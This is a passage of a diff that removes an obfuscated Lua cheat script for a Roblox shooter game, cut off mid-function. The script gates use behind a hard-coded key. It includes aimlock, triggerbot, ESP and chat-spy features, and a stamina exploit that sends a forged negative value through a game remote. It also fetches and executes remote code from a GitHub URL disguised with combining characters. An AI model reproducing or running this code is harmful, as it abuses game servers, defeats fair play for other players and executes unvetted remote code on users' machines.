@@ -1,1 +1,2138 @@
-if (_G.ScriptKey and (_G.ScriptKey=="skibidigyat1259")) then else game.Players.LocalPlayer:Kick("wrong key stop tryna use my shit");return;end if (_G.Injected and (_G.Injected==true)) then return;end _G.Injected=true;Drawing=Drawing;local function v0(v117,v118,v119) local v120=Drawing.new(v117);if v118 then for v464,v465 in pairs(v118) do v120[v464]=v465;end end if v119 then table.insert(v119,v120);end return v120;end local v1=v0("Circle",{Radius=250,Visible=true,Color=Color3.new(1,1,1),Thickness=2,Filled=false});local v2=v0("Circle",{Radius=50,Visible=true,Color=Color3.new(0,0,0),Thickness=2,Filled=false});getgenv().Flags={};local v4={};local v5={};local v6={};local v7={};do Flags['Prediction']=8;Flags['Smoothing']=87;Flags['KOCheck']=true;Flags['GlockBoostAmount']=90;Flags['GlockBoost']=false;Flags['YOffset']= -20;Flags['InfiniteStamina']=false;Flags['AutoReset']=false;v7['targetPlayer']=nil;v7['holding']=nil;Flags['AirShotScale']=0;v7['CameraLocked']=false;v7['Boosted']=false;v7['Firing']=false;Flags['AimlockFOVSize']=250;Flags['TriggerbotFOVSize']=70;Flags['Triggerbot']=false;Flags['AntiGroundHit']=false;Flags['Blatant']=false;Flags['SpawnGamepass']=false;Flags['ChatSpy']=false;v7['ESP']=false;v7['ESPName']=false;v7['ESPHealth']=false;v7['ESPVest']=false;Flags['SpawnLocation']="Front";Flags['AutoShoot']=true;Flags['LookAt']=false;Flags['LookAtSmoothing']=80;Flags['AimlockVisible']=true;Flags['TriggerbotVisible']=true;end local v8="1.0.2";local v9="Oden.txt";if  not isfile(v9) then writefile(v9,[[]]);end local function v10(v152) if cloneref then return cloneref(game:GetService(v152));else return game:GetService(v152);end end local v11=v10("UserInputService");local v12=v10("Debris");local v13=v10("TweenService");local v14=v10("SoundService");local v15=v10("Players");local v16=v10("RunService");local v17=v10("ReplicatedStorage");local v18=v10("Stats");local v19=v10("HttpService");local v20=v10("CoreGui");local v21=v10("TestService");local v22=v10("TeleportService");local v23={Filtering=v17:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering"),sayMessage=v17:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"),GetAdmin=function() return loadstring(game:HttpGet("https://raw.githubusercontent.com/uujxUjio/Imperial/refs/heads/main/D%CC%B7%CD%9B%CD%82%CC%A7%CD%85%C3%A5%CC%B8%CC%94%CC%9A%CC%9C7%D2%89%CC%A8%CC%8D%C4%85%CC%B7%CD%98%CC%8E%CC%ACM%D2%88%CC%B5%CC%863%CD%9C%CC%9B%CC%BF%CC%A9N%CC%B8%CD%9B%CC%91!%D2%89%CC%BA%CD%85"))();end};local v24=workspace.CurrentCamera;v5['RenderStepped']=v16.RenderStepped;v5['Heartbeat']=v16.Heartbeat;v5['Stepped']=v16.Stepped;local v24,v31=game.Workspace.CurrentCamera,game.Workspace.CurrentCamera;local v32=v15.LocalPlayer;local v33=function() return v32.Character or v32.CharacterAdded:Wait() ;end;local v34=v32:GetMouse();local v35=workspace.Raycast;local v36=Vector3.new(0, -30,0);local v37=Vector3.new(0,6,0);local v38={};local v39={};function getRemote(v153,v154) if (game.PlaceId==16702351217) then if (v153=="Shotty") then return v32.Character:FindFirstChild("Shotty").Shoot:FireServer(v154);elseif (v153=="Glock") then return v32.Character:FindFirstChild("Glock").Shoot:FireServer(v154);end elseif (game.PlaceId==15852982099) then if (v153=="Shotty") then return v17.ShottyFire:FireServer(v154);elseif (v153=="Glock") then return v17.GlockFire:FireServer(v154);end end end local v40=v32.PlayerGui.Chat.Frame;local v41=v40.ChatBarParentFrame.Position;local v42=CFrame.new;local v43=Vector3.new;local v44=Vector2.new;local v45=Instance.new;local v46=TweenInfo.new;local v47=Color3.fromRGB;local v48={Auto_Key={Value=Enum.UserInputType.MouseButton1},Camlock_Key={Value=Enum.KeyCode.Q},OpenDoor_Key={Value=Enum.KeyCode.X}};local v49={R1=v42( -520,4,55),R2=v42( -494,4,121),R3=v42( -492,4,52),R4=v42( -464,4,54),R5=v42( -466,4,121),R6=v42( -438,4,124),R7=v42( -436,4,55),R8=v42( -411,4,123),R9=v42( -409,4,55),R10=v42( -381,4,54),R11=v42( -383,4,120),R12=v42( -355,4,119),R13=v42( -353,4,55)};local v50={F1=v42( -2249,18320, -3080),F2=v42( -2247,18320, -3144)};local v51={B1=v42( -2444,18320, -3078),B2=v42( -2443,18320, -3145)};local function v52(v155,v156,v157) if  not v155 then v155="";end if  not v156 then v156=6;end if  not v157 then v157=v47(170,85,235);end local v158=v45("ScreenGui",v15.LocalPlayer:WaitForChild("PlayerGui"));local v159=75;local v160=30;local v161= #v6 * v160 ;local v162=v45("Frame");v162.Position=UDim2.new(0, -30,0,v159 + v161 );v162.Size=UDim2.new(0,0,0,23);v162.BackgroundTransparency=0;v162.Parent=v158;v162.BackgroundColor3=Color3.fromRGB(37,37,37);v162.BorderSizePixel=1;v162.BorderColor3=Color3.fromRGB(0,0,0);local v170=v45("Frame");v170.Parent=v162;v170.Size=UDim2.new(1, -4,1, -4);v170.BackgroundColor3=Color3.fromRGB(17,17,17);v170.Position=UDim2.new(0,2,0,2);v170.BorderSizePixel=1;v170.BorderColor3=Color3.fromRGB(0,0,0);local v177=v45("Frame");v177.Size=UDim2.new(0,1,1,0);v177.Parent=v170;v177.BackgroundColor3=v157;v177.Position=UDim2.new(0,0,0,0);v177.BorderSizePixel=0;local v183=v45("Frame");v183.Size=UDim2.new(0,0,0,1);v183.Position=UDim2.new(0,0,0,15);v183.Parent=v170;v183.BackgroundColor3=v157;v183.BorderSizePixel=0;local v189=v45("TextLabel");v189.TextXAlignment=Enum.TextXAlignment.Left;v189.Position=UDim2.new(0,3,0,0);v189.Size=UDim2.new(1,0,1,0);v189.Parent=v170;v189.Font=Enum.Font.Ubuntu;v189.TextColor3=Color3.new(1,1,1);v189.BackgroundTransparency=1;v189.TextSize=12;v189.Text=v155;v162.Size=UDim2.new(0,v189.TextBounds.X + 20 ,0,19);v183.Size=UDim2.new(0,1,0,1);local v201=v45("Sound");v201.Name="Ohkay";v201.SoundId="rbxassetid://8726881116";v201.Parent=v162;v201:Play();local v205=v46(0.4,Enum.EasingStyle.Quart,Enum.EasingDirection.Out);local v206=v13:Create(v162,v205,{Size=UDim2.new(0,v189.TextBounds.X + 10 ,0,19),Position=UDim2.new(0,20,0,v159 + v161 )});v206:Play();local v207=v13:Create(v183,v205,{Size=UDim2.new(0,v170.AbsoluteSize.X-1 ,0,1)});v207:Play();table.insert(v6,v162);task.spawn(function() task.wait(v156);local v355=v13:Create(v162,v46(1,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{BackgroundTransparency=1});v355:Play();v355.Completed:Connect(function() v162:Destroy();for v467,v468 in pairs(v6) do if (v468==v162) then table.remove(v6,v467);break;end end for v469,v470 in pairs(v6) do local v471=(v469-1) * v160 ;v13:Create(v470,v46(0.5,Enum.EasingStyle.Quart,Enum.EasingDirection.Out),{Position=UDim2.new(0,20,0,v159 + v471 )}):Play();end end);end);end local v53={};local v54={};local v55={connections={}};local v56=game:GetService("UserInputService");local v57=game:GetService("CoreGui");v53.__index=v53;do v54.Create=function(v356,v357) local v357=v357 or {} ;if v357.Type then local v472=Instance.new(v357.Type);if (v357.Properties and (typeof(v357.Properties)=="table")) then for v624,v625 in pairs(v357.Properties) do v472[v624]=v625;end end return v472;end end;v54.Connection=function(v358,v359) local v359=v359 or {} ;if v359.Type then local v473=v359.Type:Connect(v359.Callback or function() end );v55.connections[ #v55.connections]=v473;return v473;end end;v54.RemoveConnection=function(v360,v361) local v361=v361 or {} ;if v361.Connection then local v475=table.find(v55.connections,v361.Connection);if v475 then v361.Connection:Disconnect();table.remove(v55.connections,v475);end end end;end do v53.Window=function(v362,v363) local v364=v363 or {} ;local v365={Pages={},Dragging=false,Delta=UDim2.new(),Delta2=Vector3.new()};local v366=v54:Create({Type="ScreenGui",Properties={Parent=v57,DisplayOrder=8888,IgnoreGuiInset=true,Name="obleus",ZIndexBehavior="Global",ResetOnSpawn=false}});game:GetService("UserInputService").InputBegan:Connect(function(v413,v414) if  not v414 then if (v413.KeyCode==Enum.KeyCode.RightAlt) then v366.Enabled= not v366.Enabled;end end end);local v367=v54:Create({Type="Frame",Properties={AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=Color3.fromRGB(51,51,51),BorderColor3=Color3.fromRGB(0,0,0),BorderMode="Inset",BorderSizePixel=1,Parent=v366,Position=UDim2.new(0.5,0,0.5,0),Size=UDim2.new(0,516,0,563)}});local v368=v54:Create({Type="Frame",Properties={AnchorPoint=Vector2.new(0.5,0.5),BackgroundColor3=Color3.fromRGB(12,12,12),BorderSizePixel=0,Parent=v367,Position=UDim2.new(0.5,0,0.5,0),Size=UDim2.new(1, -2,1, -2)}});local v369=v54:Create({Type="TextButton",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v368,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0,24),Text=""}});local v370=v54:Create({Type="TextLabel",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v368,Position=UDim2.new(0,9,0,6),Size=UDim2.new(1, -16,0,15),Font="Code",RichText=true,Text=v364.Name or v364.name or "obleus" ,TextColor3=Color3.fromRGB(142,142,142),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Left"}});local v371=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v368,Position=UDim2.new(0,8,0,22),Size=UDim2.new(1, -16,0,2)}});local v372=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(170,85,235),BorderSizePixel=0,Parent=v371,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0,1)}});local v373=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(101,51,141),BorderSizePixel=0,Parent=v371,Position=UDim2.new(0,0,0,1),Size=UDim2.new(1,0,0,1)}});local v374=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(1,1,1),BorderSizePixel=0,Parent=v368,Position=UDim2.new(0,8,0,29),Size=UDim2.new(1, -16,0,30)}});local v375=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(1,1,1),BorderSizePixel=0,Parent=v374,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1, -1,1,0)}});v54:Create({Type="UIListLayout",Properties={Padding=UDim.new(0,0),Parent=v375,FillDirection="Horizontal"}});local v376=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(51,51,51),BorderColor3=Color3.fromRGB(0,0,0),BorderMode="Inset",BorderSizePixel=1,Parent=v368,Position=UDim2.new(0,8,0,65),Size=UDim2.new(1, -16,1, -76)}});local v377=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(13,13,13),BorderSizePixel=0,Parent=v376,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2)}});local v378=v54:Create({Type="Folder",Properties={Parent=v377}});local v379=v54:Connection({Type=v369.InputBegan,Callback=function(v415) if ( not v365.Dragging and (v415.UserInputType==Enum.UserInputType.MouseButton1)) then v365.Dragging=true;v365.Delta=v367.Position;v365.Delta2=v415.Position;end end});local v380=v54:Connection({Type=v56.InputEnded,Callback=function(v416) if (v365.Dragging and (v416.UserInputType==Enum.UserInputType.MouseButton1)) then v365.Dragging=false;v365.Delta=UDim2.new();v365.Delta2=Vector3.new();end end});local v381=v54:Connection({Type=v56.InputChanged,Callback=function(v417) if v365.Dragging then local v521=v417.Position-v365.Delta2 ;v367.Position=UDim2.new(v365.Delta.X.Scale,v365.Delta.X.Offset + v521.X ,v365.Delta.Y.Scale,v365.Delta.Y.Offset + v521.Y );end end});v365.RefreshTabs=function(v418) for v476,v477 in pairs(v365.Pages) do v477.Tab.Size=UDim2.new(1/ #v365.Pages ,0,1,0);end end;v365.Page=function(v419,v420) local v421=v420 or {} ;local v422={Open=false};local v423=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v375,Size=UDim2.new(1,0,1,0)}});local v424=v54:Create({Type="TextButton",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v423,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,1,0)}});local v425=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(41,41,41),BorderSizePixel=0,Parent=v423,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -1,1, -2)}});local v426=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(41,41,41),BorderSizePixel=0,Parent=v425,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2)}});local v427=v54:Create({Type="UIGradient",Properties={Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(100,100,100))}),Rotation=90,Parent=v426}});local v428=v54:Create({Type="TextLabel",Properties={AnchorPoint=Vector2.new(0,0.5),BackgroundTransparency=1,BorderSizePixel=0,Parent=v426,Position=UDim2.new(0,4,0.5,0),Size=UDim2.new(1, -8,0,15),Font="Code",RichText=true,Text=v421.Name or v421.name or "tab" ,TextColor3=Color3.fromRGB(142,142,142),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Center"}});local v429=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v378,Position=UDim2.new(0,10,0,10),Size=UDim2.new(1, -20,1, -20),Visible=false}});local v430=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v429,Position=UDim2.new(0,0,0,0),Size=UDim2.new(0.5, -5,1,0)}});local v431=v54:Create({Type="Frame",Properties={AnchorPoint=Vector2.new(1,0),BackgroundTransparency=1,BorderSizePixel=0,Parent=v429,Position=UDim2.new(1,0,0,0),Size=UDim2.new(0.5, -5,1,0)}});v54:Connection({Type=v424.MouseButton1Down,Callback=function() if  not v422.open then for v628,v629 in pairs(v365.Pages) do if (v629~=v422) then v629:Turn(false);end end end v422:Turn(true);end});v422.Turn=function(v479,v480) v428.TextColor3=(v480 and Color3.fromRGB(170,85,235)) or Color3.fromRGB(142,142,142) ;v427.Color=(v480 and ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(155,155,155))})) or ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(100,100,100))}) ;v422.PageHolder.Visible=v480;v422.Open=v480;end;v422.Section=function(v485,v486) local v487=v486 or {} ;local v488={};local v489=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(45,45,45),BorderColor3=Color3.fromRGB(13,13,13),BorderMode="Inset",BorderSizePixel=1,Parent=v422[(((v487.Side and (v487.Side:lower()=="right")) or (v487.side and (v487.side:lower()=="right"))) and "Right") or "Left" ],Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,0,(v487.Size or v487.size or 200) + 4 )}});local v490=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(19,19,19),BorderSizePixel=0,Parent=v489,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2)}});local v491=v54:Create({Type="TextLabel",Properties={AnchorPoint=Vector2.new(0,0.5),BackgroundTransparency=1,BorderSizePixel=0,Parent=v489,Position=UDim2.new(0,13,0,0),Size=UDim2.new(1, -26,0,15),Font="Code",RichText=true,Text=v487.Name or v487.name or "new section" ,TextColor3=Color3.fromRGB(205,205,205),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Left",ZIndex=2}});local v492=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(19,19,19),BorderSizePixel=0,Parent=v489,Position=UDim2.new(0,9,0,0),Size=UDim2.new(0,v491.TextBounds.X + 6 ,0,1)}});local v493=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v489,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2),Visible=false}});local v494=v54:Create({Type="Frame",Properties={AnchorPoint=Vector2.new(1,0),BackgroundColor3=Color3.fromRGB(45,45,45),BorderSizePixel=0,Parent=v493,Position=UDim2.new(1,0,0,0),Size=UDim2.new(0,5,1,0),ZIndex=3}});local v495=v54:Create({Type="ImageLabel",Properties={AnchorPoint=Vector2.new(0,1),BackgroundTransparency=1,BorderSizePixel=0,Parent=v493,Position=UDim2.new(0,0,1,0),Size=UDim2.new(1,0,0,20),ZIndex=2,Image="rbxassetid://7783533907",ImageTransparency=0,ImageColor3=Color3.fromRGB(19,19,19),ScaleType="Stretch"}});local v496=v54:Create({Type="ScrollingFrame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v490,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,1,0),ZIndex=4,AutomaticCanvasSize="Y",BottomImage="rbxassetid://7783554086",CanvasSize=UDim2.new(0,0,0,0),MidImage="rbxassetid://7783554086",ScrollBarImageColor3=Color3.fromRGB(65,65,65),ScrollBarThickness=4,TopImage="rbxassetid://7783554086",VerticalScrollBarInset="ScrollBar"}});v54:Create({Type="UIListLayout",Properties={Padding=UDim.new(0,5),Parent=v496,FillDirection="Vertical"}});local v497=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(19,19,19),BorderSizePixel=0,Parent=v496,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1,0,0,10)}});v488.Update=function(v523) if (v496.AbsoluteCanvasSize.Y>((v487.Size or v487.size or 200) + 4)) then v493.Visible=true;else v493.Visible=false;end end;v488.Label=function(v524,v525) local v526=v525 or {} ;local v527={};local v528=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v496,Size=UDim2.new(1,0,0,14)}});local v529=v54:Create({Type="TextLabel",Properties={AnchorPoint=Vector2.new(0,0),BackgroundTransparency=1,BorderSizePixel=0,Parent=v528,Size=UDim2.new(1, -(v526.Offset or 36),1,0),Position=UDim2.new(0,v526.Offset or 36 ,0,0),Font="Code",RichText=true,Text=v526.Name or v526.name or v526.Text or v526.text or "new label" ,TextColor3=Color3.fromRGB(180,180,180),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Left"}});v527.Remove=function(v595) v528:Remove();v527=nil;v488:Update();end;v488:Update();return v527;end;v488.Toggle=function(v531,v532) local v533=v532 or {} ;local v534={state=v533.Default or v533.default or v533.Def or v533.def or false ,callback=v533.Callback or v533.callback or function() end };local v535=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v496,Size=UDim2.new(1,0,0,14)}});local v536=v54:Create({Type="TextButton",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v535,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,1,0),Text=""}});local v537=v54:Create({Type="TextLabel",Properties={AnchorPoint=Vector2.new(0,0),BackgroundTransparency=1,BorderSizePixel=0,Parent=v535,Size=UDim2.new(1, -36,1,0),Position=UDim2.new(0,36,0,0),Font="Code",RichText=true,Text=v533.Name or v533.name or v533.Text or v533.text or "new toggle" ,TextColor3=Color3.fromRGB(180,180,180),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Left"}});local v538=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(1,1,1),BorderSizePixel=0,Parent=v535,Position=UDim2.new(0,16,0,2),Size=UDim2.new(0,10,0,10)}});local v539=v54:Create({Type="Frame",Properties={BackgroundColor3=(v534.state and Color3.fromRGB(170,85,235)) or Color3.fromRGB(63,63,63) ,BorderSizePixel=0,Parent=v538,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2)}});local v540=v54:Create({Type="UIGradient",Properties={Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(125,125,125))}),Rotation=90,Parent=v539}});local v541=v54:Connection({Type=v536.MouseButton1Down,Callback=function() v534.state= not v534.state;v539.BackgroundColor3=(v534.state and Color3.fromRGB(170,85,235)) or Color3.fromRGB(63,63,63) ;v534.callback(v534.state);end});v534.Remove=function(v598) v535:Remove();v534=nil;v54:RemoveConnection({Connection=v541});v541=nil;v488:Update();end;v534.Get=function(v599) return v534.state;end;v534.Set=function(v600,v601) if (typeof(v601)=="boolean") then v534.state=v601;if (v534.state==true) then v539.BackgroundColor3=Color3.fromRGB(170,85,235);else v539.BackgroundColor3=Color3.fromRGB(63,63,63);end end end;v488:Update();return v534;end;v488.Button=function(v545,v546) local v547=v546 or {} ;local v548={callback=v547.Callback or v547.callback or function() end };local v549=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v496,Size=UDim2.new(1,0,0,20)}});local v550=v54:Create({Type="TextButton",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v549,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,1,0),Text=""}});local v551=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(45,45,45),BorderColor3=Color3.fromRGB(1,1,1),BorderMode="Inset",BorderSizePixel=1,Parent=v549,Position=UDim2.new(0,16,0,0),Size=UDim2.new(1, -32,1,0)}});local v552=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(25,25,25),BorderSizePixel=0,Parent=v551,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2)}});local v553=v54:Create({Type="TextLabel",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v549,Size=UDim2.new(1, -32,1,0),Position=UDim2.new(0,16,0,0),Font="Code",RichText=true,Text=v547.Name or v547.name or v547.Text or v547.text or "new button" ,TextColor3=Color3.fromRGB(180,180,180),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Center"}});local v554=v54:Connection({Type=v550.MouseButton1Down,Callback=function() v548.callback();end});v548.Remove=function(v602) v549:Remove();v548=nil;v54:RemoveConnection({Connection=v554});v554=nil;v488:Update();end;v488:Update();return v548;end;v488.Slider=function(v556,v557) local v558=v557 or {} ;local v559={state=v558.Default or v558.default or v558.Def or v558.def or 0 ,min=v558.Minimum or v558.minimum or v558.Min or v558.min or 0 ,max=v558.Maximum or v558.maximum or v558.Max or v558.max or 10 ,decimals=1/(v558.Decimals or v558.decimals or v558.Tick or v558.tick or 0.25) ,suffix=v558.Suffix or v558.suffix or v558.Ending or v558.ending or "" ,callback=v558.Callback or v558.callback or function() end ,holding=false};local v560=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v496,Size=UDim2.new(1,0,0,((v558.Name or v558.name or v558.Text or v558.text) and 24) or 10 )}});local v561=v54:Create({Type="TextButton",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v560,Position=UDim2.new(0,0,0,0),Size=UDim2.new(1,0,1,0),Text=""}});if (v558.Name or v558.name or v558.Text or v558.text) then local v632=v54:Create({Type="TextLabel",Properties={AnchorPoint=Vector2.new(0,0),BackgroundTransparency=1,BorderSizePixel=0,Parent=v560,Size=UDim2.new(1, -16,0,14),Position=UDim2.new(0,16,0,0),Font="Code",RichText=true,Text=v558.Name or v558.name or v558.Text or v558.text ,TextColor3=Color3.fromRGB(180,180,180),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Left"}});end local v562=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(1,1,1),BorderSizePixel=0,Parent=v560,Position=UDim2.new(0,16,0,((v558.Name or v558.name or v558.Text or v558.text) and 14) or 0 ),Size=UDim2.new(1, -32,0,10)}});local v563=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(63,63,63),BorderSizePixel=0,Parent=v562,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2)}});local v564=v54:Create({Type="UIGradient",Properties={Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(125,125,125))}),Rotation=90,Parent=v563}});local v565=v54:Create({Type="Frame",Properties={BackgroundTransparency=1,BorderSizePixel=0,Parent=v562,Position=UDim2.new(0,1,0,1),Size=UDim2.new(1, -2,1, -2)}});local v566=v54:Create({Type="Frame",Properties={BackgroundColor3=Color3.fromRGB(170,85,235),BorderSizePixel=0,Parent=v565,Position=UDim2.new(0,0,0,0),Size=UDim2.new(0.5,0,1,0)}});local v564=v54:Create({Type="UIGradient",Properties={Color=ColorSequence.new({ColorSequenceKeypoint.new(0,Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,Color3.fromRGB(125,125,125))}),Rotation=90,Parent=v566}});local v567=v54:Create({Type="TextLabel",Properties={AnchorPoint=Vector2.new(0.5,0.25),BackgroundTransparency=1,BorderSizePixel=0,Parent=v566,Size=UDim2.new(0,10,0,14),Position=UDim2.new(1,0,0.5,0),Font="Code",RichText=true,Text=tostring(v559.state)   .. tostring(v559.suffix) ,TextColor3=Color3.fromRGB(180,180,180),TextStrokeTransparency=0.5,TextSize=13,TextXAlignment="Left"}});local v568=v54:Connection({Type=v561.MouseButton1Down,Callback=function() v559.holding=true;v559:Refresh();end});local v569=v54:Connection({Type=v56.InputEnded,Callback=function() v559.holding=false;end});local v570=v54:Connection({Type=v56.InputChanged,Callback=function() if v559.holding then v559:Refresh();end end});v559.Remove=function(v605) v560:Remove();v559=nil;v54:RemoveConnection({Connection=v568});v568=nil;v54:RemoveConnection({Connection=v569});v569=nil;v54:RemoveConnection({Connection=v570});v570=nil;v488:Update();end;v559.Get=function(v606) return v559.state;end;v559.Set=function(v607,v608) v559.state=math.clamp(math.round(v608 * v559.decimals )/v559.decimals ,v559.min,v559.max);v566.Size=UDim2.new(1 -((v559.max-v559.state)/(v559.max-v559.min)) ,0,1,0);v567.Text=tostring(v559.state)   .. tostring(v559.suffix) ;pcall(v559.callback,v559.state);end;v559.Refresh=function(v612) if v559.holding then local v646=v56:GetMouseLocation();v559:Set(math.clamp(math.floor((v559.min + ((v559.max-v559.min) * (math.clamp(v646.X-v566.AbsolutePosition.X ,0,v565.AbsoluteSize.X)/v565.AbsoluteSize.X))) * v559.decimals )/v559.decimals ,v559.min,v559.max));end end;v488:Update();v559:Set(v559.state);return v559;end;return v488;end;v422.Tab=v423;v422.PageHolder=v429;v422.Left=v430;v422.Right=v431;v365.Pages[ #v365.Pages + 1 ]=v422;v365:RefreshTabs();return v422;end;return v365;end;end local function v59(v212) local v213=v212.Character;if ( not v213 or  not v213:FindFirstChild("HumanoidRootPart")) then return false;end local v214,v215=v24:WorldToViewportPoint(v213.HumanoidRootPart.Position);if  not v215 then return false;end local v216=v24.CFrame.Position;local v217=(v213.HumanoidRootPart.Position-v216).Unit;local v218=Ray.new(v216,v217 * 1000 );local v219=workspace:FindPartOnRayWithIgnoreList(v218,{v24,v32.Character});if (v219 and v219:IsDescendantOf(v213)) then return true;else return false;end end local function v60(v220) local v221=v220.Character;if v220.Character:FindFirstChildOfClass("ForceField") then return true;else return false;end end function Inf() if Flags['InfiniteStamina'] then v17.Touch1:FireServer({Handle={Swing=workspace.OneHoop.Score.Sound},Info={Stam={Value= -(Value or math.huge)},Range={Value=0}}},0,false,0);v32.Backpack:FindFirstChild("ServerTraits").Stann:Destroy();local v439=v45("IntValue");v439.Name="Stann";v439.Parent=v32.Backpack:FindFirstChild("ServerTraits");v439.Value=100;else return;end end local function v61(v222) if v222.Character:FindFirstChild("BulletResist") then return true;else return false;end end local function v62(v223) if (v223.Character:FindFirstChild("KO") or (v223.Character:FindFirstChildOfClass("Humanoid").Health==0)) then return true;else return false;end end local function v63(v224) if  not v7['ESP'] then for v503,v504 in ipairs(v15:GetPlayers()) do if (v504.Character and v504.Character:FindFirstChild("Head")) then local v613,v614=v504.Character.Head,v504.Character;if (v613:FindFirstChild("wl") and v614:FindFirstChild("ohkay")) then v613:FindFirstChild("wl"):Destroy();v614:FindFirstChild("ohkay"):Destroy();return;end end end end local v225=v45("BillboardGui");local v226=v45("TextLabel",v225);local v227=v45("Highlight");v227.Name="ohkay";v227.FillTransparency=0.7;v227.OutlineTransparency=0;v227.FillColor=Color3.fromRGB(170,85,235);v227.OutlineColor=Color3.fromRGB(255,255,255);v225.Name="wl";v225.Adornee=v15[v224].Character:FindFirstChild("Head");v225.AlwaysOnTop=true;v225.ExtentsOffset=v43(0,1,0);v225.Size=UDim2.new(0,5,0,5);v226.Name="wl";v226.BackgroundColor3=Color3.new(1,1,1);v226.BackgroundTransparency=1;v226.BorderSizePixel=0;v226.Position=UDim2.new(0,0,0, -40);v226.Size=UDim2.new(1,0,10,0);v226.Visible=true;v226.ZIndex=10;v226.Font=Enum.Font.ArialBold;v226.TextSize=14;v226.Text="";v226.TextColor3=Color3.fromRGB(255,255,255);v226.TextStrokeColor3=Color3.fromRGB(255,255,255);v226.TextStrokeTransparency=1;spawn(function() while true do pcall(function() local v505=v15[v224].Character;if (v505 and v505:FindFirstChild("Head")) then v225.Parent=v505.Head;v227.Parent=v505;v225.Adornee=v15[v224].Character:FindFirstChild("Head");v226.Text="";if v7['ESPName'] then v226.Text=v15[v224].DisplayName;end if v7['ESPVest'] then v226.Text=v226.Text   .. " Vested: "   .. tostring(v61(v15[v224])) ;end if v7['ESPHealth'] then local v650=v505:FindFirstChildOfClass("Humanoid");if v650 then v226.Text=v226.Text   .. " Health: "   .. tostring(math.floor(v650.Health)) ;end end end end);task.wait();end end);end function MakeSound() local v253=v45("Sound",workspace);v253.Name="Ohkay";v253.SoundId="rbxassetid://8726881116";v253:Play();v12:AddItem(v253,v253.TimeLength + 1 );end local function v64(v256) return 1 